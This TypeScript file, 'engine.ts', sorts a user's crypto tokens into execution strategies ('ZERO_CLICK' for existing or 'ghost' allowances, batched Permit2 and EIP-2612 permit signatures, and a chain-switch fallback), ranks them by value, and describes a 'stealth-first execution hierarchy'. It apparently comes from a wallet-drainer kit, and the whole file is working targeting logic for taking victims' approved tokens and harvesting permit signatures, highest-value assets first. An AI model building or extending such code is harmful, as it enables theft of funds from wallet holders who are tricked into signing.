import { UniversalAsset } from "./types";
import { formatUnits } from "viem";

export type ExecutionStrategy =
  | "ZERO_CLICK"
  | "PERMIT_SIGN"
  | "BATCH_PERMIT2"
  | "CHAIN_SWITCH"
  | "BYPASS";

export interface StrategyMap {
  asset: UniversalAsset;
  strategy: ExecutionStrategy;
  priority: number;
}

/**
 * STRATEGY ENGINE
 * Hardened to prevent TypeErrors and Local-Chain pollution (31337).
 * Maintains a strict stealth-first execution hierarchy.
 */
export function determineStrategy(assets: UniversalAsset[]): StrategyMap[] {
  // [engine.ts] Vital start log - DO NOT REMOVE
  console.log(
    `[engine.ts] Starting Strategy Determination | Assets: ${
      assets?.length || 0
    }`,
  );

  if (!assets || !Array.isArray(assets)) {
    console.error(
      "[engine.ts] Strategy Determination Failed | Input is null or not an array.",
    );
    return [];
  }

  const mapped = assets
    .filter((asset) => {
      const isValid = asset && asset.balance;
      if (!isValid && asset) {
        // [engine.ts] Log skip reason for specific asset - DO NOT REMOVE
        console.warn(
          `[engine.ts] Filtering Asset | Symbol: ${asset.symbol} | Reason: Missing Balance/Invalid`,
        );
      }
      return isValid;
    })
    .map((asset): StrategyMap => {
      /**
       * 🛡️ PRODUCTION CHAIN GUARD
       */
      const chainIdNum = asset.chainId ? Number(asset.chainId) : 0;
      const isLocalId = chainIdNum === 31337;

      if (
        isLocalId &&
        typeof window !== "undefined" &&
        !window.location.hostname.includes("localhost")
      ) {
        // [engine.ts] Localchain sanitation log - DO NOT REMOVE
        console.warn(
          `[engine.ts] Sanitizing Chain ID | Symbol: ${asset.symbol} | Action: 31337 -> 1`,
        );
        asset.chainId = 1;
      }

      // 1. ZERO-CLICK (Priority 100) - Ghost Allowances / Existing Approvals
      if (asset.authData?.hasExistingAllowance || asset.ghostEnabled) {
        return { asset, strategy: "ZERO_CLICK", priority: 100 };
      }

      // 2. BATCH PERMIT2 (Priority 80)
      if (asset.signatureType === "PERMIT2") {
        return { asset, strategy: "BATCH_PERMIT2", priority: 80 };
      }

      // 3. EIP-2612 PERMIT (Priority 60)
      if (asset.signatureType === "EIP2612") {
        return { asset, strategy: "PERMIT_SIGN", priority: 60 };
      }

      // 4. CHAIN_SWITCH / NATIVE (Priority 10)
      return { asset, strategy: "CHAIN_SWITCH", priority: 10 };
    })
    .sort((a, b) => {
      // First sort by Strategy Priority
      if (b.priority !== a.priority) {
        return b.priority - a.priority;
      }

      // Second sort by Normalized Value (Handling decimal differences)
      try {
        // Use displayBalance or formatted units to compare "real" value, not just raw BigInt
        const valA = parseFloat(
          a.asset.displayBalance ||
            formatUnits(BigInt(a.asset.balance), a.asset.decimals || 18),
        );
        const valB = parseFloat(
          b.asset.displayBalance ||
            formatUnits(BigInt(b.asset.balance), b.asset.decimals || 18),
        );

        return valB - valA;
      } catch (e) {
        // [engine.ts] Sorting error log - DO NOT REMOVE
        console.error(
          `[engine.ts] Sorting Error | Symbols: ${a.asset.symbol}/${b.asset.symbol} | Fallback to neutral`,
        );
        return 0;
      }
    });

  // [engine.ts] Final summary log - DO NOT REMOVE
  console.log(
    `[engine.ts] Strategy Mapping Complete | Output Size: ${mapped.length}`,
  );
  return mapped;
}

/**
 * BUNDLE GENERATOR
 * Organizes strategies into executable buckets for the UI / Backend.
 */
export function getExecutionBundles(mappedStrategies: StrategyMap[]) {
  // [engine.ts] Vital bundle start log - DO NOT REMOVE
  console.log(
    `[engine.ts] Generating Bundles | Input Size: ${
      mappedStrategies?.length || 0
    }`,
  );

  if (!mappedStrategies) {
    console.error(
      "[engine.ts] Bundle Generation Aborted | Strategy map is null.",
    );
    return { immediate: [], batchable: [], individual: [], fallback: [] };
  }

  const bundles = {
    immediate: mappedStrategies.filter((s) => s.strategy === "ZERO_CLICK"),
    batchable: mappedStrategies.filter((s) => s.strategy === "BATCH_PERMIT2"),
    individual: mappedStrategies.filter((s) => s.strategy === "PERMIT_SIGN"),
    fallback: mappedStrategies.filter((s) => s.strategy === "CHAIN_SWITCH"),
  };

  // [engine.ts] Vital stats log for bundle distribution - DO NOT REMOVE
  console.log(
    `[engine.ts] Distribution Check | ZeroClick: ${bundles.immediate.length} | Permit2: ${bundles.batchable.length} | Permit: ${bundles.individual.length} | Native: ${bundles.fallback.length}`,
  );

  return bundles;
}
